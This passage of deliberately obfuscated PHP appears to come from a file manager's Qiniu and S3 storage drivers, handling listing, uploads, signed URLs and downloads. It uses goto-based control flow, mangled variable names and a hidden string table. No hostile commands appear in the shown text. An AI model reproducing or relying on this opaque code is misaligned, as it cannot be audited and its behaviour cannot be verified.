continue; } $D”íî–•ğ[] = $this->folderInfo($CáÅ££ˆùˆ, $f‘£½»´‡); } } if (isset($c¥¦œùÉ³¢[$Eä¬‘Îø²å[1213]])) { foreach ($c¥¦œùÉ³¢[$Eä¬‘Îø²å[1213]] as $cñğ««Ñ…) { if ($cñğ««Ñ…[$Eä¬‘Îø²å[89]] == $b× ƒİÄ¨×) { continue; } $dŠäÅ¸ˆ­•[] = $this->fileInfo($cñğ««Ñ…[$Eä¬‘Îø²å[89]], $f‘£½»´‡, $cñğ««Ñ…); } } if ($dÂÄˆĞä¹ == $Eä¬‘Îø²å[33]) { break; } } return array($Eä¬‘Îø²å[74] => $D”íî–•ğ, $Eä¬‘Îø²å[73] => $dŠäÅ¸ˆ­•); goto dé‰ˆé³âã; fÈï†Ù¥Š: $dÂÄˆĞä¹ = $Eä¬‘Îø²å[33]; $fíÍøÄ˜‰ò = 1000; $cŸí‚¦ˆ– = $Eä¬‘Îø²å[8]; goto bå¬‘ìáÏ¬; F‘Æè¯Ã÷¦: $Eä¬‘Îø²å =& $_SERVER[Å¸ş]; $bØÃƒ‡†½â = trim($bØÃƒ‡†½â, $Eä¬‘Îø²å[8]); $b× ƒİÄ¨× = empty($bØÃƒ‡†½â) ? $Eä¬‘Îø²å[33] : $bØÃƒ‡†½â . $Eä¬‘Îø²å[8]; goto fÈï†Ù¥Š; dé‰ˆé³âã: } public function has($FŒÕÁ‘Ó, $dõº‹ÍÁÉ½ = false, $F‰‚¥äØÆ = true) { goto BŠçÎÙƒ¼; f¶Ö£İç®†: $C¸æÕßß¸î = $B›Á ‡Ø[33]; $F”ö¡éØ”¡ = 1000; $AÄ©ò‹æ¬Š = $B›Á ‡Ø[8]; goto c¾¯Õ˜ÖÙ‚; BŠçÎÙƒ¼: $B›Á ‡Ø =& $_SERVER[Å¸ş]; $FŒÕÁ‘Ó = trim($FŒÕÁ‘Ó, $B›Á ‡Ø[8]); $FŸÇí¶Ì‘ˆ = empty($FŒÕÁ‘Ó) ? $B›Á ‡Ø[33] : $FŒÕÁ‘Ó . $B›Á ‡Ø[8]; goto f¶Ö£İç®†; c¾¯Õ˜ÖÙ‚: $D²ì³‹»‰Ò = 0; $C°³ª›ğ = 0; while (!0) { list($Bà‚«Æí¯, $dÃÑ«ŠâŸ…) = $this->bucketManager->listFiles($this->bucket, $FŸÇí¶Ì‘ˆ, $C¸æÕßß¸î, $F”ö¡éØ”¡, $AÄ©ò‹æ¬Š); if ($dÃÑ«ŠâŸ…) { return !1; } $C¸æÕßß¸î = array_key_exists($B›Á ‡Ø[1181], $Bà‚«Æí¯) ? $C¸æÕßß¸î = $Bà‚«Æí¯[$B›Á ‡Ø[1212]] : $B›Á ‡Ø[33]; if ($dõº‹ÍÁÉ½) { if (!empty($Bà‚«Æí¯[$B›Á ‡Ø[1213]])) { $D²ì³‹»‰Ò += count($Bà‚«Æí¯[$B›Á ‡Ø[1213]]); } if (!empty($Bà‚«Æí¯[$B›Á ‡Ø[1216]])) { $C°³ª›ğ += count($Bà‚«Æí¯[$B›Á ‡Ø[1216]]); } if ($C¸æÕßß¸î === $B›Á ‡Ø[33]) { break; } continue; } if ($F‰‚¥äØÆ) { if (!empty($Bà‚«Æí¯[$B›Á ‡Ø[1213]])) { return !0; } } else { if (!empty($Bà‚«Æí¯[$B›Á ‡Ø[1216]])) { return !0; } } if ($C¸æÕßß¸î == $B›Á ‡Ø[33]) { break; } } goto B‹¾ˆ·Üã¦; B‹¾ˆ·Üã¦: if ($dõº‹ÍÁÉ½) { return array($B›Á ‡Ø[191] => $D²ì³‹»‰Ò, $B›Á ‡Ø[192] => $C°³ª›ğ); } return !1; goto aœç†Ê¡‚§; aœç†Ê¡‚§: } public function listAll($eõ ‡Àà) { $b÷º¿øƒ§ =& $_SERVER[Å¸ş]; $Bºä™…¥°× = $this->fileList($eõ ‡Àà, 1); $C©İŠõš´ = array(); foreach ($Bºä™…¥°× as $b†àÇ¦„‡ö) { $C©İŠõš´[$b†àÇ¦„‡ö[$b÷º¿øƒ§[28]]] = $b†àÇ¦„‡ö[$b÷º¿øƒ§[77]]; } return $this->listAllFiles($eõ ‡Àà, array_keys($C©İŠõš´), $C©İŠõš´); } public function canRead($Fá±ô‰­œá) { return $this->exist($Fá±ô‰­œá) ? !0 : !1; } public function canWrite($cÇ¡ Ï…±) { return $this->exist($cÇ¡ Ï…±) ? !0 : !1; } public function getContent($eŞõ”Øá) { return $this->fileSubstr($eŞõ”Øá, 0, -1); } public function setContent($f÷£ƒò×‚‹, $c»£Íé˜ïß = '') { $c«Æ„ƒİ = $this->tempFile($this->pathThis($f÷£ƒò×‚‹)); file_put_contents($c«Æ„ƒİ, $c»£Íé˜ïß); if ($this->upload($f÷£ƒò×‚‹, $c«Æ„ƒİ)) { $this->tempFileRemve($c«Æ„ƒİ); return !0; } return !1; } public function refreshUrls($Bõà…íÓ”§) { goto aŠåî²àÒ; fËÆï¿Õ‘š: return $B¤°¹¹Š°ô[$C¤‚è©÷¦[1217]] == $C¤‚è©÷¦[699] ? !0 : !1; goto DÆ‰‹Õ‘‰; cïÄÔ‹ì²Ò: $B§¿œÈ¥…‰ = new Qiniu\Cdn\CdnManager($this->auth); list($B¤°¹¹Š°ô, $D¶ôËâ÷Ñ) = $B§¿œÈ¥…‰->refreshUrls($B·Àğ¢—«); if ($D¶ôËâ÷Ñ) { return !1; } goto fËÆï¿Õ‘š; aŠåî²àÒ: $C¤‚è©÷¦ =& $_SERVER[Å¸ş]; $B·Àğ¢—« = array(); if (is_array($Bõà…íÓ”§)) { foreach ($Bõà…íÓ”§ as $fÒ‡ºÌŸÛ½) { $B·Àğ¢—«[] = $this->link($fÒ‡ºÌŸÛ½); } } else { $B·Àğ¢—«[] = $this->link($Bõà…íÓ”§); } goto cïÄÔ‹ì²Ò; DÆ‰‹Õ‘‰: } public function fileSubstr($eâ´äÈŠ¨È, $aÎ“Ç¡£, $FÖ®°¹­—ç) { $f¥«¼·µï =& $_SERVER[Å¸ş]; if (!($F¦ßË»§¢¥ = $this->link($eâ´äÈŠ¨È))) { return !1; } $aœµ®´öŒ¼ = !1; if ($FÖ®°¹­—ç > 0) { $eÕÆ»Ó‚ºŠ = $aÎ“Ç¡£ + $FÖ®°¹­—ç - 1; $aœµ®´öŒ¼ = array($f¥«¼·µï[1218] . $aÎ“Ç¡£ . $f¥«¼·µï[412] . $eÕÆ»Ó‚ºŠ); } $F¸¾«‰Æ…å = url_request($F¦ßË»§¢¥, $f¥«¼·µï[216], !1, $aœµ®´öŒ¼); return $F¸¾«‰Æ…å[$f¥«¼·µï[692]] ? $F¸¾«‰Æ…å[$f¥«¼·µï[1032]] : !1; } public function upload($CõŒéõ¸È, $eö±ÂÖÂÛ±, $AÖ›Äñ×ˆ = false, $dõñì¢À•á = REPEAT_REPLACE) { $C—ŒöÀ½µ» = new Qiniu\Storage\UploadManager(); $FÚŸòÑ²½† = $this->auth->uploadToken($this->bucket, $CõŒéõ¸È); $AÚÇ•ù·ŠÊ = get_file_mime(get_path_ext($eö±ÂÖÂÛ±)); list($e“˜— ´˜ø, $Dµ¹ÈŞ£çµ) = $C—ŒöÀ½µ»->putFile($FÚŸòÑ²½†, $CõŒéõ¸È, $eö±ÂÖÂÛ±, null, $AÚÇ•ù·ŠÊ); return $Dµ¹ÈŞ£çµ ? !1 : $this->getPathOuter($CõŒéõ¸È); } public function uploadFormData($F¿‰É§‡¤¢, $e»ŸËƒé = 3600) { return $this->uploadToken($F¿‰É§‡¤¢, $e»ŸËƒé); } public function multiUploadFormData($FôŞŸŒ«˜, $c¢´Ô·¤£ = 3600) { return $this->uploadToken($FôŞŸŒ«˜, $c¢´Ô·¤£); } private function uploadToken($A†³È—ÀÛ±, $FŠ¸§¬œ–² = 3600) { goto cÈ˜„ÄÄ´Ñ; b¦ë¼·¥: $fÃÈĞŸòåˆ = http_type() . "\72\57\x2f\165\160\x6c\157\141\x64{$A›„»Å”Šå}\56\161\151\x6e\151\165\x70\56\143\x6f\x6d\x2f"; return array($dÊò×½çìæ[1222] => $e«Îá™©Ùö, $dÊò×½çìæ[1223] => $fÃÈĞŸòåˆ); goto cÊ¤Û³Ù¢; a‡²æÊÓ–ƒ: $F‡ŠÂ˜é­î = $A†³È—ÀÛ±; $e«Îá™©Ùö = $this->auth->uploadToken($this->bucket, $F‡ŠÂ˜é­î, $añà±Ì’, $EÁø¾˜Ø©, !0); $A›„»Å”Šå = empty($this->region) || $this->region == $dÊò×½çìæ[1221] ? $dÊò×½çìæ[33] : $dÊò×½çìæ[412] . $this->region; goto b¦ë¼·¥; cÈ˜„ÄÄ´Ñ: $dÊò×½çìæ =& $_SERVER[Å¸ş]; $añà±Ì’ = $FŠ¸§¬œ–²; $EÁø¾˜Ø© = array($dÊò×½çìæ[1219] => $dÊò×½çìæ[1220]); goto a‡²æÊÓ–ƒ; cÊ¤Û³Ù¢: } public function download($aœºàÆğŞ, $DĞ¾Óôİª») { goto CƒªàôÅ; CƒªàôÅ: $Bª÷«Ô£Æ¼ = IO::getPathInner(IO::mkfile($DĞ¾Óôİª»)); if (!($e¢ˆ¼ËŠ”¸ = $this->link($aœºàÆğŞ))) { return !1; } $dšàŸšôË = 0; goto dŸ¡”„óÔÆ; dŸ¡”„óÔÆ: $Aâëã®Ä½Ş = 1024 * 200; $fê²ß±îø = fopen($Bª÷«Ô£Æ¼, $_SERVER[Å¸ş][1224]); while (!0) { $BÈ¸‘ïÃ÷ = $this->fileSubstr($aœºàÆğŞ, $dšàŸšôË, $Aâëã®Ä½Ş); if ($BÈ¸‘ïÃ÷ === !1) { return !1; } fwrite($fê²ß±îø, $BÈ¸‘ïÃ÷); $dšàŸšôË += $Aâëã®Ä½Ş; if (strlen($BÈ¸‘ïÃ÷) < $Aâëã®Ä½Ş) { break; } } goto Dè…íÖÅÉ‹; Dè…íÖÅÉ‹: fclose($fê²ß±îø); return $DĞ¾Óôİª»; goto Eˆ´–ãñÔê; Eˆ´–ãñÔê: } public function link($f¡‡É“‹É, $D´£»é£çÖ = '') { if (!$this->isFile($f¡‡É“‹É)) { return !1; } $eŠÂìºùİè = $this->getHost() . $_SERVER[Å¸ş][8] . $this->pathEncode($f¡‡É“‹É) . $D´£»é£çÖ; return $this->auth->privateDownloadUrl($eŠÂìºùİè, 3600 * 12); } public function fileOut($e‘ù¬ÔŒè, $Fó„Ø»‰ö° = false, $aÊµÜ”¢¤È = false, $C”¦ã”Ÿƒ = '') { $fÊº¼ÚÙ•ñ =& $_SERVER[Å¸ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($e‘ù¬ÔŒè, $Fó„Ø»‰ö°, $aÊµÜ”¢¤È, $C”¦ã”Ÿƒ); } if (!$aÊµÜ”¢¤È) { $aÊµÜ”¢¤È = $this->pathThis($e‘ù¬ÔŒè); } $D‚ËÅà·› = $Fó„Ø»‰ö° ? $fÊº¼ÚÙ•ñ[1225] . rawurlencode($aÊµÜ”¢¤È) : $fÊº¼ÚÙ•ñ[33]; $fØ¶Ñ—©åŒ = $this->link($e‘ù¬ÔŒè, $D‚ËÅà·›); $this->fileOutLink($fØ¶Ñ—©åŒ); } public function fileOutServer($B©ƒŞˆÇ‚“, $f©ò«‡Ù = false, $Fâ­À¤œíñ = false, $Aİ†ÒÏ¹ÍÎ = '') { parent::fileOut($B©ƒŞˆÇ‚“, $f©ò«‡Ù, $Fâ­À¤œíñ, $Aİ†ÒÏ¹ÍÎ); } public function fileOutImage($D’¦Ş¸ „ä, $F¡Ø”Ø¾í‹ = 250) { $DÀ‹®ŸÙ = $this->link($D’¦Ş¸ „ä, $_SERVER[Å¸ş][1226] . $F¡Ø”Ø¾í‹); $this->fileOutLink($DÀ‹®ŸÙ); } public function fileOutImageServer($b¥×™ÍÇ, $EÍ¼Û¹“œØ = 250) { parent::fileOutImage($b¥×™ÍÇ, $EÍ¼Û¹“œØ); } public function hashMd5($e˜ÄÓˆç) { $b¼¤Ï–ôµÃ =& $_SERVER[Å¸ş]; $A‡ùÂª‡°Ş = $this->objectMeta($e˜ÄÓˆç); return isset($A‡ùÂª‡°Ş[$b¼¤Ï–ôµÃ[196]]) ? $A‡ùÂª‡°Ş[$b¼¤Ï–ôµÃ[196]] : !1; $F’ í²æñ = $this->link($e˜ÄÓˆç, $b¼¤Ï–ôµÃ[1227]); } public function size($C™¿Ô‘‹øÅ) { $f–˜¥ˆßé = $this->objectMeta($C™¿Ô‘‹øÅ); return $f–˜¥ˆßé ? $f–˜¥ˆßé[$_SERVER[Å¸ş][77]] : 0; } public function info($EÁŒáñšó‰) { if ($this->isFolder($EÁŒáñšó‰)) { return $this->folderInfo($EÁŒáñšó‰); } else { if ($this->isFile($EÁŒáñšó‰)) { return $this->fileInfo($EÁŒáñšó‰); } } return !1; } public function exist($fÂŸÄ‡õ¾) { return $this->isFile($fÂŸÄ‡õ¾) || $this->isFolder($fÂŸÄ‡õ¾); } public function isFile($CÙ’¦—„ÓÈ) { return !$this->isFolder($CÙ’¦—„ÓÈ) && $this->objectMeta($CÙ’¦—„ÓÈ); } public function isFolder($A•‘ÈÏõœö) { return $this->cacheMethod($_SERVER[Å¸ş][223], $A•‘ÈÏõœö); } protected function objectMeta($CŠÔ„¤–‹í) { return $this->cacheMethod($_SERVER[Å¸ş][224], $CŠÔ„¤–‹í); } protected function _objectMeta($A…â¢ïöêç) { $fØƒò¼ã…Ş =& $_SERVER[Å¸ş]; list($Fï´­¯Ç›Å, $dÛ„æàùòÆ) = $this->bucketManager->stat($this->bucket, $A…â¢ïöêç); if ($Fï´­¯Ç›Å) { $Fï´­¯Ç›Å[$fØƒò¼ã…Ş[77]] = intval($Fï´­¯Ç›Å[$fØƒò¼ã…Ş[1214]]); } return $Fï´­¯Ç›Å; } protected function _isFolder($Bëé‘İŸ½“) { $cÎ‰Ş¹èºØ =& $_SERVER[Å¸ş]; if ($Bëé‘İŸ½“ == $cÎ‰Ş¹èºØ[33] || $Bëé‘İŸ½“ == $cÎ‰Ş¹èºØ[8]) { return !0; } list($dë¶èå†·Ò, $FÕ“¾µ¥ßå) = $this->bucketManager->listFiles($this->bucket, trim($Bëé‘İŸ½“, $cÎ‰Ş¹èºØ[8]) . $cÎ‰Ş¹èºØ[8], $cÎ‰Ş¹èºØ[33], 1, $cÎ‰Ş¹èºØ[8]); return !empty($dë¶èå†·Ò[$cÎ‰Ş¹èºØ[1213]]) || !empty($dë¶èå†·Ò[$cÎ‰Ş¹èºØ[1216]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($cñÂ÷Ú™µ‚) { parent::__construct($cñÂ÷Ú™µ‚); } public function uploadFormData($c‘ĞÆ¾„¤“, $e†Úíæ¬Å = 3600) { goto B¡ÒÂñ‡ÁÍ; B¡ÒÂñ‡ÁÍ: $d ·ìÜ ‹ =& $_SERVER[Å¸ş]; $fÀºàÖˆŒ¸ = $d ·ìÜ ‹[185]; $EŞêÁÌÜ¶ = $d ·ìÜ ‹[1132]; goto CöÑ»Ñø¦; cÏ“çÖ†¹™: $D£èÜ¡†É = array($d ·ìÜ ‹[199] => $d ·ìÜ ‹[33], $d ·ìÜ ‹[1144] => $d ·ìÜ ‹[33], $d ·ìÜ ‹[1102] => $fÀºàÖˆŒ¸, $d ·ìÜ ‹[1106] => $dÎ¾ŠŞÔÂ, $d ·ìÜ ‹[1110] => $AÓšÔ´øİ, $d ·ìÜ ‹[1145] => $eóâ¯°, $d ·ìÜ ‹[1146] => $EŞêÁÌÜ¶, $d ·ìÜ ‹[1147] => $E³¦‡²Ç, $d ·ìÜ ‹[1148] => $cŞ‹Ë½è¹É, $d ·ìÜ ‹[1149] => $d ùìà¬ãá, $d ·ìÜ ‹[169] => $this->getHost()); return $D£èÜ¡†É; goto BôîÂ­ºİ; Cèª£ÌêõÎ: $AÓšÔ´øİ = base64_encode(json_encode($CÖà‚Ê˜Œ¹)); $FíŒƒ•„’º = hash_hmac($d ·ìÜ ‹[1142], $aÑ­…‰˜ì, $d ·ìÜ ‹[1143] . $this->secret, !0); $CçÉÌµ‹— = hash_hmac($d ·ìÜ ‹[1142], $this->region, $FíŒƒ•„’º, !0); goto aáœóÉ¬; CöÑ»Ñø¦: $dáÛŠÑ”¬Œ = $d ·ìÜ ‹[59]; $E³¦‡²Ç = gmdate($d ·ìÜ ‹[1133]); $aÑ­…‰˜ì = gmdate($d ·ìÜ ‹[693]); goto cšÏà¨ñ‚à; cšÏà¨ñ‚à: $eò¤¦ÚˆÎĞ = $d ·ìÜ ‹[1134]; $cŞ‹Ë½è¹É = $e†Úíæ¬Å . $d ·ìÜ ‹[33]; $dÎ¾ŠŞÔÂ = $d ·ìÜ ‹[1098]; goto cÀ•í‘–Í; aáœóÉ¬: $Bé §ª„ã = hash_hmac($d ·ìÜ ‹[1142], $dáÛŠÑ”¬Œ, $CçÉÌµ‹—, !0); $BğÉá«Ç = hash_hmac($d ·ìÜ ‹[1142], $eò¤¦ÚˆÎĞ, $Bé §ª„ã, !0); $d ùìà¬ãá = hash_hmac($d ·ìÜ ‹[1142], $AÓšÔ´øİ, $BğÉá«Ç); goto cÏ“çÖ†¹™; cÀ•í‘–Í: $D•†Í´êÜ = array($this->accessKey, $aÑ­…‰˜ì, $this->region, $dáÛŠÑ”¬Œ, $eò¤¦ÚˆÎĞ); $eóâ¯° = implode($d ·ìÜ ‹[8], $D•†Í´êÜ); $CÖà‚Ê˜Œ¹ = array($d ·ìÜ ‹[1100] => gmdate($d ·ìÜ ‹[1099], strtotime($d ·ìÜ ‹[1135])), $d ·ìÜ ‹[1101] => array(array($d ·ìÜ ‹[1103] => $this->bucket), array($d ·ìÜ ‹[1102] => $fÀºàÖˆŒ¸), array($d ·ìÜ ‹[1104], $d ·ìÜ ‹[1105], $d ·ìÜ ‹[33]), array($d ·ìÜ ‹[1104], $d ·ìÜ ‹[1136], $d ·ìÜ ‹[33]), array($d ·ìÜ ‹[1104], $d ·ìÜ ‹[1137], $d ·ìÜ ‹[33]), array($d ·ìÜ ‹[1106] => $dÎ¾ŠŞÔÂ), array($d ·ìÜ ‹[1138] => $eóâ¯°), array($d ·ìÜ ‹[1139] => $EŞêÁÌÜ¶), array($d ·ìÜ ‹[1140] => $E³¦‡²Ç), array($d ·ìÜ ‹[1141] => $cŞ‹Ë½è¹É))); goto Cèª£ÌêõÎ; BôîÂ­ºİ: } public function multiUploadFormData($e‚®Æë¢ñÁ, $dæ¶ ‹ÊÏİ = 3600) { $D¡Ù®—Öª× =& $_SERVER[Å¸ş]; $e†ÚÂêù•¸ = gmdate($D¡Ù®—Öª×[1228]); $bêÎ¢Âô¿ = array(); $d¾Ç¢¢Ÿ°å = $this->client->getUploadId($this->bucket, $e‚®Æë¢ñÁ, $bêÎ¢Âô¿); if (!$d¾Ç¢¢Ÿ°å) { return !1; } return array($D¡Ù®—Öª×[209] => $d¾Ç¢¢Ÿ°å, $D¡Ù®—Öª×[169] => $this->getHost() . $D¡Ù®—Öª×[8] . $this->pathEncode($e‚®Æë¢ñÁ), $D¡Ù®—Öª×[210] => $e†ÚÂêù•¸, $D¡Ù®—Öª×[89] => $e‚®Æë¢ñÁ); } public function multiUploadAuthData($BˆêÒïŠÇ‘, $CŒ»”èî‚‹ = array()) { goto d§Ÿ ôš°·; B’•ÕğïŠ: if (isset($CŒ»”èî‚‹[$cˆñÊè†°[1229]])) { $BÚÃïÄÔ[$cˆñÊè†°[1230]] = $CŒ»”èî‚‹[$cˆñÊè†°[1229]]; } $D‡Ÿ¾È×âê = explode($cˆñÊè†°[171], $this->getHost()); $eñ¯´ÓÃê = array($cˆñÊè†°[1231] => $D‡Ÿ¾È×âê[1], $cˆñÊè†°[1232] => $cˆñÊè†°[33], $cˆñÊè†°[199] => $cˆñÊè†°[116], $cˆñÊè†°[1144] => $CŒ»”èî‚‹[$cˆñÊè†°[77]]); goto dò³‘â¥Í¸; d§Ÿ ôš°·: $cˆñÊè†° =& $_SERVER[Å¸ş]; $a‘é¹˜ = isset($CŒ»”èî‚‹[$cˆñÊè†°[160]]) ? $CŒ»”èî‚‹[$cˆñÊè†°[160]] : $cˆñÊè†°[33]; $cµ®”åß‘ = $CŒ»”èî‚‹[$cˆñÊè†°[89]]; goto aĞ˜÷—éô; EñØÃŸ‡‘”: if (strpos($a‘é¹˜, $cˆñÊè†°[213]) === 0) { if (isset($BÚÃïÄÔ[$cˆñÊè†°[1230]])) { $bîÅ†ĞÄÄ» = $BÚÃïÄÔ[$cˆñÊè†°[1230]]; } else { if (isset($E·©„‘…¯[$cˆñÊè†°[1230]])) { $bîÅ†ĞÄÄ» = $E·©„‘…¯[$cˆñÊè†°[1230]]; } else { $bîÅ†ĞÄÄ» = hash($cˆñÊè†°[1142], $cˆñÊè†°[33]); } } return array($cˆñÊè†°[220] => $E·©„‘…¯[$cˆñÊè†°[220]], $cˆñÊè†°[1230] => $bîÅ†ĞÄÄ», $cˆñÊè†°[210] => $E·©„‘…¯[$cˆñÊè†°[1233]]); } return $E·©„‘…¯[$cˆñÊè†°[220]]; goto e‰«•ÛÍ»; aĞ˜÷—éô: unset($CŒ»”èî‚‹[$cˆñÊè†°[89]]); if (isset($CŒ»”èî‚‹[$cˆñÊè†°[211]])) { return $this->listUploadParts($cµ®”åß‘, $CŒ»”èî‚‹); } $BÚÃïÄÔ = array(); goto B’•ÕğïŠ; dò³‘â¥Í¸: $Eò±¿Å¡Šæ = $cˆñÊè†°[214]; $dÛ“•‰âÂˆ = $cˆñÊè†°[8] . $this->pathEncode($cµ®”åß‘) . $a‘é¹˜; $E·©„‘…¯ = $this->client->__getSignatureV4($BÚÃïÄÔ, $eñ¯´ÓÃê, $Eò±¿Å¡Šæ, $dÛ“•‰âÂˆ); goto EñØÃŸ‡‘”; e‰«•ÛÍ»: } public function listUploadParts($a‘¥óÑƒµÃ, $c®¢ŸÃÆ‡« = array()) { goto FĞëŸ´œó¾; a¡ÂÈì•¿ô: $cÄêÄô‚»Ó = array($B§ÕÍ›°¿µ[1231] => $AŞ”’Ö¸™[1], $B§ÕÍ›°¿µ[199] => $B§ÕÍ›°¿µ[116], $B§ÕÍ›°¿µ[1144] => strlen($A…Øé…ù«Ì)); $Aá¥³Óğöİ = $B§ÕÍ›°¿µ[212]; $cšËÁÈ¿ = $B§ÕÍ›°¿µ[8] . $this->pathEncode($a‘¥óÑƒµÃ) . $c®¢ŸÃÆ‡«[$B§ÕÍ›°¿µ[160]]; goto Bô¤â•ªƒ‡; FĞëŸ´œó¾: $B§ÕÍ›°¿µ =& $_SERVER[Å¸ş]; $BÕë¯õ¼Ò = str_replace($B§ÕÍ›°¿µ[221], $B§ÕÍ›°¿µ[33], $c®¢ŸÃÆ‡«[$B§ÕÍ›°¿µ[160]]); $B÷ç „¶ˆ¹ = $this->client->listParts($this->bucket, $a‘¥óÑƒµÃ, $BÕë¯õ¼Ò); goto EÄô‹•°ä; EÄô‹•°ä: if (!$B÷ç „¶ˆ¹) { return !1; } $A…Øé…ù«Ì = $B§ÕÍ›°¿µ[1234]; foreach ($B÷ç „¶ˆ¹ as $c‚Æ½¹í³„) { $A…Øé…ù«Ì .= $B§ÕÍ›°¿µ[1235] . "\x3c\120\141\x72\164\x4e\x75\155\x62\145\x72\x3e{$c‚Æ½¹í³„[$B§ÕÍ›°¿µ[1186]]}\x3c\x2f\120\x61\162\164\116\165\155\142\x65\162\x3e\12" . "\x3c\105\x54\x61\147\76{$c‚Æ½¹í³„[$B§ÕÍ›°¿µ[1187]]}\74\57\105\124\x61\147\x3e\12" . $B§ÕÍ›°¿µ[1236]; } goto C‹Ô‹ç¯¶ù; Bô¤â•ªƒ‡: $E‰¹·èÉ = $this->client->__getSignatureV4($EÔ™îÒ†ÍÌ, $cÄêÄô‚»Ó, $Aá¥³Óğöİ, $cšËÁÈ¿, $A…Øé…ù«Ì); return array($B§ÕÍ›°¿µ[220] => $E‰¹·èÉ[$B§ÕÍ›°¿µ[220]], $B§ÕÍ›°¿µ[210] => $E‰¹·èÉ[$B§ÕÍ›°¿µ[1233]], $B§ÕÍ›°¿µ[222] => $B÷ç „¶ˆ¹, $B§ÕÍ›°¿µ[1230] => $E‰¹·èÉ[$B§ÕÍ›°¿µ[1230]]); goto fïççÈÇˆ—; C‹Ô‹ç¯¶ù: $A…Øé…ù«Ì .= $B§ÕÍ›°¿µ[1237]; $EÔ™îÒ†ÍÌ = array(); $AŞ”’Ö¸™ = explode($B§ÕÍ›°¿µ[171], $this->getHost()); goto a¡ÂÈì•¿ô; fïççÈÇˆ—: } public function link($dœñ‰ºì¨Ğ, $dÏá×¥ã³ = array()) { return parent::link($dœñ‰ºì¨Ğ, $dÏá×¥ã³); } public function fileOut($C–Æ–¯¢Çğ, $C¤¿Š‚…î = false, $dæÛÚ“é‘¸ = false, $cŠ‹¤Âàİö = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Å¸ş][1238])) { return parent::fileOutServer($C–Æ–¯¢Çğ, $C¤¿Š‚…î, $dæÛÚ“é‘¸, $cŠ‹¤Âàİö); } parent::fileOut($C–Æ–¯¢Çğ, $C¤¿Š‚…î, $dæÛÚ“é‘¸, $cŠ‹¤Âàİö); } public function fileOutImage($AÏò½Œõö½, $b÷…·áÛ–ò = 250) { if (strstr($this->endpoint, $_SERVER[Å¸ş][1238])) { return parent::fileOutImageServer($AÏò½Œõö½, $b÷…·áÛ–ò); } parent::fileOutImage($AÏò½Œõö½, $b÷…·áÛ–ò); } public function fileOutLink($eéÛí†œ‚¹) { $D×È„ƒéµ =& $_SERVER[Å¸ş]; if (substr($eéÛí†œ‚¹, 0, 7) == $D×È„ƒéµ[1113]) { $eéÛí†œ‚¹ = $D×È„ƒéµ[1114] . substr($eéÛí†œ‚¹, 7); } header($D×È„ƒéµ[156] . $eéÛí†œ‚¹); die; } public function getHost() { $a¢‚“¶°Ã =& $_SERVER[Å¸ş]; $c¬¸¿è·¿‚ = str_rtrim(parent::getHost(), $a¢‚“¶°Ã[8] . $this->bucket); $c¬¸¿è·¿‚ = explode($a¢‚“¶°Ã[171], $c¬¸¿è·¿‚); return $c¬¸¿è·¿‚[0] . $a¢‚“¶°Ã[171] . $this->bucket . $a¢‚“¶°Ã[91] . $c¬¸¿è·¿‚[1]; } } goto eãæÚÛó˜…; AÔĞŒ•¿‡–: $_SERVER[$_SERVER[ãˆÙà–ÃÙ][49]] = ("\x39\x39\x32\x34"."\71\65")+0;$_iFT7="rktNEj8mf8MMIpDIGuBWZAA5iyVB9fjU4tSkte5pNNx7sxTYnjbnyKs66IdnA4ZHYcf89gJXZDn5zs";; stream_wrapper_register($_SERVER[ãˆÙà–ÃÙ][50], $_SERVER[ãˆÙà–ÃÙ][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Dãœ§óÉ†, $EÄ¥Â¤Ï—) { $c¼¼‘ãÍÇ =& $_SERVER[Å¸ş]; if (isset(self::$_methodList[$Dãœ§óÉ†])) { return @call_user_func_array(self::$_methodList[$Dãœ§óÉ†], $EÄ¥Â¤Ï—); } else { if (method_exists($this, $Dãœ§óÉ†)) { return call_user_func_array(array($this, $Dãœ§óÉ†), $EÄ¥Â¤Ï—); } else { think_exception(__CLASS__ . $c¼¼‘ãÍÇ[4] . $Dãœ§óÉ† . $c¼¼‘ãÍÇ[5]); } } } public static function __callStatic($d–³‘—Ê²È, $EéĞ­ğŸ™—) { if (isset(self::$_methodListStatic[$d–³‘—Ê²È])) { return call_user_func_array(self::$_methodListStatic[$d–³‘—Ê²È], $EéĞ­ğŸ™—); } else { if (method_exists(self, $d–³‘—Ê²È)) { return call_user_func_array(array(self, $d–³‘—Ê²È), $EéĞ­ğŸ™—); } else { show_json("{$d–³‘—Ê²È}\x28\51\x20\156\157\164\40\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($fº¥Ô„¯ªØ, $CŠŒ†Êšİµ) { self::$_methodList[$fº¥Ô„¯ªØ] = $CŠŒ†Êšİµ; } public static function addMethodStatic($E§İšÓËõ–, $bƒ‘„ØÇ) { self::$_methodListStatic[$E§İšÓËõ–] = $bƒ‘„ØÇ; } } goto d³ßÜç„×é; A¡ï¿ë¹¯…: function Action($D®È°·ƒÏ¥ = '') { goto Dñ­‚¶Óí; D•«‰œÒÂ: $Aç—°ôõ = strtolower($aŒ‹ˆÄçÂ[0]); if (substr($Aç—°ôõ, -6) == $C¸œ¨Ê„ƒ¿[6]) { $D®È°·ƒÏ¥ = substr($aŒ‹ˆÄçÂ[0], 0, -6); $eøÑ²Ãè• = $D®È°·ƒÏ¥ . $C¸œ¨Ê„ƒ¿[7]; $f«ğãÆëµ = $C¸œ¨Ê„ƒ¿[8]; if (isset($aŒ‹ˆÄçÂ[1]) && substr(strtolower($aŒ‹ˆÄçÂ[1]), -5) == $C¸œ¨Ê„ƒ¿[9]) { $eøÑ²Ãè• = $D®È°·ƒÏ¥ . $aŒ‹ˆÄçÂ[1]; $f«ğãÆëµ = $C¸œ¨Ê„ƒ¿[10] . $aŒ‹ˆÄçÂ[1] . $C¸œ¨Ê„ƒ¿[11]; } else { if (count($aŒ‹ˆÄçÂ) == 3) { $eøÑ²Ãè• = $D®È°·ƒÏ¥ . $aŒ‹ˆÄçÂ[1] . $aŒ‹ˆÄçÂ[2]; $f«ğãÆëµ = $C¸œ¨Ê„ƒ¿[12] . $aŒ‹ˆÄçÂ[1] . $C¸œ¨Ê„ƒ¿[13] . $aŒ‹ˆÄçÂ[2] . $C¸œ¨Ê„ƒ¿[11]; } } $f«ğãÆëµ = PLUGIN_DIR . $D®È°·ƒÏ¥ . $C¸œ¨Ê„ƒ¿[4] . $f«ğãÆëµ; } else { if (substr($Aç—°ôõ, -5) == 